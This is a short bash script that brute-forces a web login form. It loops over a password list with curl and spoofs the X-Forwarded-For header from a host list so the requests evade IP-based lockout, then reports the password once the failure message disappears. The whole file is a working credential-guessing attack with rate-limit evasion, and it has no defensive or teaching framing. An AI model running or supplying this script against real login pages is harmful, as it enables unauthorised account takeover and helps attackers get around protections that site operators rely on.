#!/bin/bash

URL=$1
username=$2
response="Invalid username or password."
echo "Finding a valid password..."

for pass in $(cat passwords.txt); do curl -s --data "username=$username&password=$pass" -H "X-Forwarded-For: `shuf -n 1 hosts.txt`"  "$URL" | grep "Invalid username or password." &> /dev/null ; if [ $? != 0 ] ; then echo "password is $pass"; break; else echo "testing $pass"; fi; done


